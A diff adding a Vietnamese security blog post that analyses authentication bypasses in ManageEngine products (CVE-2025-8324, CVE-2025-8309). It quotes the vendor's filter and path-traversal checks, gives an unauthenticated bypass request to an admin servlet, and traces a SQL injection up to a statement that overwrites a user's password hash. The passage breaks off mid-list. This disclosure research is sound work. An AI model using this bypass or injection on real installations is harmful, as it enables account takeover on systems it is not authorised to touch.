@@ -1,0 +1,678 @@
+<!DOCTYPE html>
+<html lang="vi-vn">
+<head>
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title> Tales of Authentication Bypass Across ManageEngine Products | devme4f&#39;s blog</title>
+  <link rel = 'canonical' href = 'https://devme4f.github.io/posts/2026/auth-bypass-across-manageengine-products/'>
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="all,follow">
+  <meta name="googlebot" content="index,follow,snippet,archive">
+  <meta property="og:title" content="Tales of Authentication Bypass Across ManageEngine Products" />
+<meta property="og:description" content="Năm ngoái mình có dịp target và tìm ra một số lỗ hổng trên các sản phẩm của Zoho ManageEngine. Bài viết sẽ chia sẻ lại quá trình này.
+Để giới thiệu qua thì ManageEngine là bộ sản phẩm IT management được nhiều tổ chức doanh nghiệp tin dùng, trải dài từ IT helpdesk, AD management, cho đến network và security monitoring. Điểm đáng chú ý là do cùng chung một dòng sản phẩm nên codebase cũng có nhiều điểm tương đồng — nhiều thư viện dùng chung, pattern lặp lại." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://devme4f.github.io/posts/2026/auth-bypass-across-manageengine-products/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2026-05-05T13:45:16+07:00" />
+<meta property="article:modified_time" content="2026-05-05T13:45:16+07:00" />
+
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Tales of Authentication Bypass Across ManageEngine Products"/>
+<meta name="twitter:description" content="Năm ngoái mình có dịp target và tìm ra một số lỗ hổng trên các sản phẩm của Zoho ManageEngine. Bài viết sẽ chia sẻ lại quá trình này.
+Để giới thiệu qua thì ManageEngine là bộ sản phẩm IT management được nhiều tổ chức doanh nghiệp tin dùng, trải dài từ IT helpdesk, AD management, cho đến network và security monitoring. Điểm đáng chú ý là do cùng chung một dòng sản phẩm nên codebase cũng có nhiều điểm tương đồng — nhiều thư viện dùng chung, pattern lặp lại."/>
+
+  
+  
+    
+  
+  
+  <link rel="stylesheet" href="https://devme4f.github.io/css/styles.a7dd5af4c7ef9f93fb31b1147bb343d14667fd6cdafa7ae17de8d923a2f6a282b9db99fd91500efb76d5de5a5603d29fb153733d9bfac95b534e595d0ab745a7.css" integrity="sha512-p91a9Mfvn5P7MbEUe7ND0UZn/Wza&#43;nrhfejZI6L2ooK525n9kVAO&#43;3bV3lpWA9KfsVNzPZv6yVtTTlldCrdFpw=="> 
+
+  
+  
+  
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  
+
+  
+<link rel="icon" type="image/png" href="https://devme4f.github.io/images/favicon.ico" />
+
+  
+  
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+  <div class="content index py4">
+
+  <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/posts">Archives</a></li>
+         
+        <li><a href="/notes">Notes</a></li>
+         
+        <li><a href="/about">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li>
+          <a class="icon" href=" https://devme4f.github.io/posts/2026/zimbra-rce-cve-2025-68645/" aria-label="Previous">
+            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
+          </a>
+        </li>
+        
+        
+        <li>
+          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
+          </a>
+        </li>
+        <li>
+          <a class="icon" href="#" aria-label="Share">
+            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
+          </a>
+        </li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2026%2fauth-bypass-across-manageengine-products%2f" aria-label="Facebook">
+      <i class="fab fa-facebook " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2026%2fauth-bypass-across-manageengine-products%2f&text=Tales%20of%20Authentication%20Bypass%20Across%20ManageEngine%20Products" aria-label="Twitter">
+      <i class="fab fa-twitter " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2026%2fauth-bypass-across-manageengine-products%2f&title=Tales%20of%20Authentication%20Bypass%20Across%20ManageEngine%20Products" aria-label="Linkedin">
+      <i class="fab fa-linkedin " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2026%2fauth-bypass-across-manageengine-products%2f&is_video=false&description=Tales%20of%20Authentication%20Bypass%20Across%20ManageEngine%20Products" aria-label="Pinterest">
+      <i class="fab fa-pinterest " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=Tales%20of%20Authentication%20Bypass%20Across%20ManageEngine%20Products&body=Check out this article: https%3a%2f%2fdevme4f.github.io%2fposts%2f2026%2fauth-bypass-across-manageengine-products%2f" aria-label="Email">
+      <i class="fas fa-envelope " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2026%2fauth-bypass-across-manageengine-products%2f&title=Tales%20of%20Authentication%20Bypass%20Across%20ManageEngine%20Products" aria-label="Pocket">
+      <i class="fab fa-get-pocket " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2026%2fauth-bypass-across-manageengine-products%2f&title=Tales%20of%20Authentication%20Bypass%20Across%20ManageEngine%20Products" aria-label="reddit">
+      <i class="fab fa-reddit " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2026%2fauth-bypass-across-manageengine-products%2f&name=Tales%20of%20Authentication%20Bypass%20Across%20ManageEngine%20Products&description=N%c4%83m%20ngo%c3%a1i%20m%c3%acnh%20c%c3%b3%20d%e1%bb%8bp%20target%20v%c3%a0%20t%c3%acm%20ra%20m%e1%bb%99t%20s%e1%bb%91%20l%e1%bb%97%20h%e1%bb%95ng%20tr%c3%aan%20c%c3%a1c%20s%e1%ba%a3n%20ph%e1%ba%a9m%20c%e1%bb%a7a%20Zoho%20ManageEngine.%20B%c3%a0i%20vi%e1%ba%bft%20s%e1%ba%bd%20chia%20s%e1%ba%bb%20l%e1%ba%a1i%20qu%c3%a1%20tr%c3%acnh%20n%c3%a0y.%0a%c4%90%e1%bb%83%20gi%e1%bb%9bi%20thi%e1%bb%87u%20qua%20th%c3%ac%20ManageEngine%20l%c3%a0%20b%e1%bb%99%20s%e1%ba%a3n%20ph%e1%ba%a9m%20IT%20management%20%c4%91%c6%b0%e1%bb%a3c%20nhi%e1%bb%81u%20t%e1%bb%95%20ch%e1%bb%a9c%20doanh%20nghi%e1%bb%87p%20tin%20d%c3%b9ng%2c%20tr%e1%ba%a3i%20d%c3%a0i%20t%e1%bb%ab%20IT%20helpdesk%2c%20AD%20management%2c%20cho%20%c4%91%e1%ba%bfn%20network%20v%c3%a0%20security%20monitoring.%20%c4%90i%e1%bb%83m%20%c4%91%c3%a1ng%20ch%c3%ba%20%c3%bd%20l%c3%a0%20do%20c%c3%b9ng%20chung%20m%e1%bb%99t%20d%c3%b2ng%20s%e1%ba%a3n%20ph%e1%ba%a9m%20n%c3%aan%20codebase%20c%c5%a9ng%20c%c3%b3%20nhi%e1%bb%81u%20%c4%91i%e1%bb%83m%20t%c6%b0%c6%a1ng%20%c4%91%e1%bb%93ng%20%e2%80%94%20nhi%e1%bb%81u%20th%c6%b0%20vi%e1%bb%87n%20d%c3%b9ng%20chung%2c%20pattern%20l%e1%ba%b7p%20l%e1%ba%a1i." aria-label="Tumblr">
+      <i class="fab fa-tumblr " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2026%2fauth-bypass-across-manageengine-products%2f&t=Tales%20of%20Authentication%20Bypass%20Across%20ManageEngine%20Products" aria-label="Hacker News">
+      <i class="fab fa-hacker-news " aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+    
+    <div id="toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#securityfilter">SecurityFilter</a></li>
+    <li><a href="#cve-2025-8324-analytics-plus-authentication-bypass--sql-injection">CVE-2025-8324: Analytics Plus Authentication Bypass &amp; SQL Injection</a></li>
+    <li><a href="#cve-2025-8309-assetexplorer-account-takeover">CVE-2025-8309: AssetExplorer Account Takeover</a>
+      <ul>
+        <li><a href="#case-1-bypass-using-other-mapping">Case 1: Bypass using other mapping</a></li>
+        <li><a href="#case-2-bypass-via-url-forwarding">Case 2: Bypass via url forwarding</a></li>
+      </ul>
+    </li>
+    <li><a href="#others">Others</a></li>
+  </ul>
+</nav>
+    </div>
+    
+  </span>
+</div>
+
+
+  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      <h1 class="posttitle" itemprop="name headline">
+        Tales of Authentication Bypass Across ManageEngine Products
+      </h1>
+      <div class="meta">
+        
+        <div class="postdate">
+          
+          <time datetime="2026-05-05 13:45:16 &#43;0700 &#43;07" itemprop="datePublished">2026-05-05</time>
+          
+        </div>
+        
+        
+        
+        
+      </div>
+    </header>
+
+  
+    
+    <div class="content" itemprop="articleBody">
+      <p>Năm ngoái mình có dịp target và tìm ra một số lỗ hổng trên các sản phẩm của Zoho ManageEngine. Bài viết sẽ chia sẻ lại quá trình này.</p>
+<p>Để giới thiệu qua thì ManageEngine là bộ sản phẩm IT management được nhiều tổ chức doanh nghiệp tin dùng, trải dài từ IT helpdesk, AD management, cho đến network và security monitoring. Điểm đáng chú ý là do cùng chung một dòng sản phẩm nên codebase cũng có nhiều điểm tương đồng — nhiều thư viện dùng chung, pattern lặp lại.</p>
+<h2 id="securityfilter">SecurityFilter</h2>
+<p>Trải qua nhiều năm phát triển, codebase lẫn attack surface của ManageEngine lớn dần. Do đó, vào khoảng năm 2022, vendor bắt đầu bổ sung thêm class <code>SecurityFilter</code> đóng vai trò như một filter trung tâm — buộc mọi request phải đi qua đây để dễ dàng kiểm soát hơn:</p>
+<pre tabindex="0"><code class="language-xml!" data-lang="xml!">&lt;filter&gt;    
+    &lt;filter-name&gt;Security Filter&lt;/filter-name&gt;
+    &lt;filter-class&gt;com.adventnet.iam.security.SecurityFilter&lt;/filter-class&gt;
+
+    &lt;init-param&gt;
+        &lt;param-name&gt;config-file&lt;/param-name&gt;
+        &lt;param-value&gt;security-properties.xml,security-defaultresponseheaders.xml,__TRUNCATED__&lt;/param-value&gt;
+    &lt;/init-param&gt;
+&lt;/filter&gt;
+
+&lt;filter-mapping&gt;
+    &lt;filter-name&gt;Security Filter&lt;/filter-name&gt;
+    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;
+&lt;/filter-mapping&gt;
+</code></pre><p>Mỗi request phải match với một ActionRule có sẵn — nếu không, request sẽ bị reject:
+<img src="/images/2026/Auth-Bypass-Across-ManageEngine-Products/URL_RULE_NOT_CONFIGURED.png" alt="URL_RULE_NOT_CONFIGURED"></p>
+<p>Để dễ hiểu:</p>
+<pre tabindex="0"><code>Request → SecurityFilter → ActionRule match? → Servlet
+                              ↓ (no match)
+                           Reject 403
+</code></pre><p>Các file <code>*.xml</code> chứa ActionRule ở <code>config-file</code> sẽ được load và có dạng như sau:</p>
+<pre tabindex="0"><code class="language-xml!" data-lang="xml!">&lt;url path=&#34;/internalconnectorapi/connector/[a-z0-9]+/db/[0-9]+/CANCREATESETUPFORORG&#34; operation-type=&#34;read&#34; authentication=&#34;required&#34; app-roles=&#34;SUPERADMIN&#34; resource=&#34;DB&#34; resource-param=&#34;db&#34; internal=&#34;true&#34;  oauthscope=&#34;metadata&#34;&gt;
+    &lt;param name=&#34;ORGID&#34; regex=&#34;zrtext&#34; secret=&#34;true&#34; /&gt;
+    &lt;param name=&#34;ORGNAME&#34; regex=&#34;zrtext&#34; secret=&#34;true&#34; /&gt;
+&lt;/url&gt;
+</code></pre><p>Một số attributes đáng chú ý:</p>
+<ul>
+<li><code>path</code>: path regex match với requestURI</li>
+<li><code>authentication</code>: yêu cầu xác thực hay không</li>
+<li><code>app-roles</code>: role của user</li>
+<li><code>&lt;param&gt;</code>: kiểu và định dạng của từng tham số được whitelist (string, long, regex&hellip;).</li>
+</ul>
+<p>Tóm lại thì <code>SecurityFilter</code> không chỉ đảm nhận việc kiểm tra xác thực mà còn giúp validate 1 request có đúng định dạng - từ requestURI, headers cho đến params/body - khiến quá trình khai thác lỗ hổng (nếu có) trở nên khó khăn hơn.</p>
+<p>Ví dụ param <code>ORGNAME</code> có kiểu <code>regex</code>, value cần match pattern sau:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;regex</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;zrtext&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;[\p{L}\p{N}\p{P}\p{S}\p{C}\p{M}\p{Z}]+&#34;</span> <span style="color:#f92672">/&gt;</span>
+</span></span></code></pre></div><p>Để bypass class này khá khó khăn khi requestURI đã bị chặn kĩ các ký tự như path parameter, url encoding hay path traversal qua các block:</p>
+<pre tabindex="0"><code class="language-java!" data-lang="java!">String uri = request.getRequestURI();
+if (uri.contains(&#34;;&#34;)) {
+    logger.log(Level.SEVERE, &#34;******INVALID******* Pathparameter value is present in the request : {0}&#34;, uri);
+    throw new IAMSecurityException(&#34;URL_RULE_NOT_CONFIGURED&#34;);
+}
+
+if (this.securityFilterConfig.isDisablePathParameterURIDecodingCheck() || !uri.contains(&#34;%3b&#34;) &amp;&amp; !uri.contains(&#34;%3B&#34;)) {
+    if (DispatcherType.REQUEST.equals(request.getDispatcherType()) &amp;&amp; (uri.contains(&#34;.&#34;) || uri.contains(&#34;%2e&#34;) || uri.contains(&#34;%2E&#34;))) {
+        for(String pattern : SecurityUtil.PATH_TRAVERSAL_PATTERNS) {
+            if (uri.contains(pattern)) {
+                logger.log(Level.SEVERE, &#34;Dot Dot Slash is present in the request URI : {0}&#34;, uri);
+                throw new IAMSecurityException(&#34;URL_RULE_NOT_CONFIGURED&#34;);
+            }
+        }
+    }
+</code></pre><p>Do vậy mình chuyển hướng qua tìm các ActionRule có thể bị misconfiguration.</p>
+<h2 id="cve-2025-8324-analytics-plus-authentication-bypass--sql-injection">CVE-2025-8324: Analytics Plus Authentication Bypass &amp; SQL Injection</h2>
+<p>Advisory: <a href="https://www.manageengine.com/analytics-plus/CVE-2025-8324.html">https://www.manageengine.com/analytics-plus/CVE-2025-8324.html</a></p>
+<p>Tại file <code>securityxmls/ZROP/security-zrop.xml</code> có rule sau dành cho các static files:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;url</span> <span style="color:#a6e22e">path=</span><span style="color:#e6db74">&#34;${contextpath}/([_a-zA-Z0-9\-\.\/]+).(npng|jpg|js|css|eot|svg|ttf|otf|woff|gif|html|ico|cur|ttf|bmp|png)&#34;</span> <span style="color:#a6e22e">app-roles=</span><span style="color:#e6db74">&#34;PUBLIC&#34;</span> <span style="color:#a6e22e">operation-type=</span><span style="color:#e6db74">&#34;read&#34;</span> <span style="color:#a6e22e">method=</span><span style="color:#e6db74">&#34;get&#34;</span> <span style="color:#a6e22e">authentication=</span><span style="color:#e6db74">&#34;optional&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span></code></pre></div><ul>
+<li>path regex khá rộng, không bị prefix, requestURI chỉ cần match với suffix</li>
+<li>không yêu cầu xác thực</li>
+<li>cho phép truyền param tùy ý, không bị kiểm tra định dạng</li>
+</ul>
+<p>Root cause của lỗ hổng này nằm ở việc path regex trong rule không được prefix, ta có thể lợi dụng rule để match request với các servlet có wildcard mapping (thường được prefix). Ví dụ:</p>
+<pre tabindex="0"><code class="language-xml!" data-lang="xml!">&lt;servlet-mapping&gt;
+    &lt;servlet-name&gt;ZAAdminPageAudit&lt;/servlet-name&gt;
+    &lt;url-pattern&gt;/admintool/*&lt;/url-pattern&gt;
+&lt;/servlet-mapping&gt;
+</code></pre><p>Request chưa xác thực sau sẽ match với static files rule trên và chạm được servlet <code>ZAAdminPageAudit</code> - dẫn đến auth bypass:</p>
+<pre tabindex="0"><code>GET /admintool/test/a.png HTTP/1.1
+Host: &lt;host&gt;
+</code></pre><p>Analytics Plus có kha khá wildcard mapping. Ngoài việc đọc chay file <code>web.xml</code>, ta có thể dynamic debug để lấy danh sách mapping này chuẩn hơn, tránh miss các trường hợp servlet được add qua runtime.</p>
+<p>Đầu tiên, cần thêm lib <code>catalina.jar</code> của tomcat vào idea để được index.
+Sau đó, tại class <code>org.apache.catalina.mapper.Mapper</code> đặt breakpoint ở method <code>internalMapWrapper()</code> để lấy field <code>wildcardWrappers</code>, khi breakpoint hit, nhấn <code>Alt +F8</code> ở ô evaluate expression để mở rộng và chạy đoạn code sau:</p>
+<pre tabindex="0"><code class="language-java!" data-lang="java!">ArrayList&lt;&gt; results = new ArrayList&lt;&gt;();
+int b = wildcardWrappers.length;
+for (int i = 0; i &lt; b; i++) {
+    results.add(wildcardWrappers[i].object.getServletClass());
+}
+results.stream().toArray();
+</code></pre><p>Ta được danh sách gồm 53 servlet class:
+<img src="/images/2026/Auth-Bypass-Across-ManageEngine-Products/Tomcat_Mapper.png" alt="Tomcat_Mapper"></p>
+<p>Sau khi phân tích, mình tìm được 1 vị trí tồn tại SQL Injection tại servlet:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;servlet&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;servlet-name&gt;</span>ZACustomConnectorAdmin<span style="color:#f92672">&lt;/servlet-name&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;servlet-class&gt;</span>com.zoho.bi.zacustomconnector.connectoradmin.ZACustomConnectorAdminServlet<span style="color:#f92672">&lt;/servlet-class&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/servlet&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;servlet-mapping&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;servlet-name&gt;</span>ZACustomConnectorAdmin<span style="color:#f92672">&lt;/servlet-name&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;url-pattern&gt;</span>/connectoradmin/*<span style="color:#f92672">&lt;/url-pattern&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/servlet-mapping&gt;</span>
+</span></span></code></pre></div><p>Servlet này được dùng bởi administrators để quản trị và cấu hình nhiều tác vụ. RequestURI sẽ được parse thành <code>uriParams</code> qua constructor sau:</p>
+<pre tabindex="0"><code class="language-java!" data-lang="java!">public ClientAPIRequest(HttpServletRequest request, HttpServletResponse response) {
+    super(request);
+    this.response = response;
+    String uri = request.getRequestURI().substring(1);
+    String[] uriArray = uri.split(&#34;/&#34;);
+    boolean isCustomInternal = uri.startsWith(&#34;internalconnectorapi/v2&#34;);
+    this.uriParams.put(&#34;action&#34;, uriArray[uriArray.length - 1]);
+    int sIndex = !uriArray[0].equals(&#34;reports&#34;) &amp;&amp; !isCustomInternal ? 1 : 2;
+
+    for(int i = sIndex; i &lt; uriArray.length - 1; i += 2) {
+        this.uriParams.put(uriArray[i], uriArray[i + 1]);
+    }
+}
+</code></pre><p>Do đó cần có format:</p>
+<pre tabindex="0"><code>/connectoradmin/action/&lt;ACTION&gt;/&lt;key1&gt;/&lt;value1&gt;/&lt;key2&gt;/&lt;value2&gt;...
+</code></pre><p>Trong đó cần set key <code>conndbinfoid</code> để request về sau không bị lỗi:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">getResourceValue</span><span style="color:#f92672">(</span>String resourceName<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">(</span>String<span style="color:#f92672">)</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">uriParams</span><span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>resourceName<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">protected</span> JSONObject <span style="color:#a6e22e">executeAPIWithTxn</span><span style="color:#f92672">(</span>ClientAPIRequest req<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    String action <span style="color:#f92672">=</span> req<span style="color:#f92672">.</span><span style="color:#a6e22e">getZDBAction</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        Long connInfoId <span style="color:#f92672">=</span> req<span style="color:#f92672">.</span><span style="color:#a6e22e">getResourceValue</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;conndbinfoid&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">?</span> Long<span style="color:#f92672">.</span><span style="color:#a6e22e">parseLong</span><span style="color:#f92672">(</span>req<span style="color:#f92672">.</span><span style="color:#a6e22e">getResourceValue</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;conndbinfoid&#34;</span><span style="color:#f92672">))</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>connInfoId <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            APIFactoryProvider<span style="color:#f92672">.</span><span style="color:#a6e22e">getThreadLocalAPI</span><span style="color:#f92672">().</span><span style="color:#a6e22e">setThreadLocalForGeneratedId</span><span style="color:#f92672">(</span>connInfoId<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// truncated...
+</span></span></span></code></pre></div><p>Với action là <code>UPDATECONNECTORMETA</code>:</p>
+<pre tabindex="0"><code class="language-java!" data-lang="java!">if (action.equals(&#34;UPDATECONNECTORMETA&#34;)) {
+
+    JSONObject response = new JSONObject();
+    Long connModId = req.getParam(&#34;CONNMODID&#34;) != null ? Long.parseLong(req.getParam(&#34;CONNMODID&#34;)) : null;
+    Long connEntityId = req.getParam(&#34;CONNENTITYID&#34;) != null ? Long.parseLong(req.getParam(&#34;CONNENTITYID&#34;)) : null;
+    String updColum = req.getRequiredParam(&#34;COLUMN&#34;);
+    String updColumValue = req.getRequiredParam(&#34;VALUE&#34;);
+    String table = req.getRequiredParam(&#34;TABLE&#34;);
+    ZAConnConsumerUtil.updateTableValue(table, updColum, updColumValue, connInfoId, connModId, connEntityId); // [1]
+    response.put(&#34;message&#34;, &#34;Restored Successfully&#34;);
+    JSONObject connPerms = response;
+    return connPerms;
+}
+</code></pre><p>Tại [1] sẽ gọi tới <code>ZAConnConsumerUtil.updateTableValue()</code>:</p>
+<pre tabindex="0"><code class="language-java!" data-lang="java!">public static void updateTableValue(String tableName, String columnName, String columnValue, Long connInfoId, Long connModId, Long connEntitiyId) throws Exception {
+    String sql = null;
+    switch (tableName) {
+        case &#34;CustomConnectorInfo&#34;:
+            sql = SQLQueryAPI.getSQLString(&#34;ZAUpdateTableColValueForConnInfo&#34;, new Object[][]{{&#34;UPDATECOLUMN&#34;, columnName}, {&#34;UPDATEDVALUE&#34;, columnValue}, {&#34;CONNINFOID&#34;, connInfoId}});
+            break;
+        case &#34;CustomConnectorModuleInfo&#34;:
+            sql = SQLQueryAPI.getSQLString(&#34;ZAUpdateTableColValueForConnModInfo&#34;, new Object[][]{{&#34;UPDATECOLUMN&#34;, columnName}, {&#34;UPDATEDVALUE&#34;, columnValue}, {&#34;CONNINFOID&#34;, connInfoId}, {&#34;CONNMODID&#34;, connModId}});
+            break;
+        case &#34;CustomConnectorEntityInfo&#34;:
+            sql = SQLQueryAPI.getSQLString(&#34;ZAUpdateTableColValueForConnEntityInfo&#34;, new Object[][]{{&#34;UPDATECOLUMN&#34;, columnName}, {&#34;UPDATEDVALUE&#34;, columnValue}, {&#34;CONNINFOID&#34;, connInfoId}, {&#34;CONNENTITYID&#34;, connEntitiyId}});
+            break;
+        case &#34;CustomConnectorModuleStatus&#34;:
+            sql = SQLQueryAPI.getSQLString(&#34;ZAUpdateTableColValueForModuleStatus&#34;, new Object[][]{{&#34;UPDATECOLUMN&#34;, columnName}, {&#34;UPDATEDVALUE&#34;, columnValue}, {&#34;CONNMODID&#34;, connModId}, {&#34;CONNENTITYID&#34;, connEntitiyId}});
+    }
+
+    if (sql != null) {
+        SQLQueryAPI.executeUpdate(sql, new RptSQLAdapter(connInfoId != null ? connInfoId : connModId));
+    }
+
+}
+</code></pre><p><code>SQLQueryAPI.getSQLString()</code> có nhiệm vụ lấy <code>sqlString</code> được định nghĩa sẵn trong file cấu hình xml, sau đó thay thế các template variable để tạo thành câu SQL hoàn chỉnh:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;sql</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;ZAUpdateTableColValueForConnInfo&#34;</span><span style="color:#f92672">&gt;</span> <span style="color:#75715e">&lt;![CDATA[
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    update CustomConnectorInfo set ${UPDATECOLUMN:STRING}= &#39;${UPDATEDVALUE:STRING}&#39; where CONNINFOID = ${CONNINFOID:LONG}
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">]]&gt;</span> <span style="color:#f92672">&lt;/sql&gt;</span>
+</span></span></code></pre></div><p>Trong quá trình này, method sẽ tự escape các ký tự ở variable - đặc biệt là dấu nháy để tránh SQLi. Tuy nhiên, các <code>sqlString</code> được sử dụng ở method này vì tin răng <code>UPDATECOLUMN</code> là an toàn nên không được bọc trong dấu nháy, case study:</p>
+<ul>
+<li><code>set '${UPDATECOLUMN:STRING}'=</code> =&gt; safe</li>
+<li><code>set ${UPDATECOLUMN:STRING}=</code> =&gt; unsafe</li>
+</ul>
+<p>Nhờ đó không cần escape dấu nháy, dẫn đến có thể inject câu lệnh sql để đổi password account bất kỳ qua update statement, nhắm vào table sau:</p>
+<pre tabindex="0"><code>update iamuserpassword set password=&#39;$2a$10$5gzarCsB3OlJLGsXSVauP.z0zaH3DH/CjMlv.ybV6hPkgCXaN6Gj.&#39; where user_auto_id=8;
+</code></pre><ul>
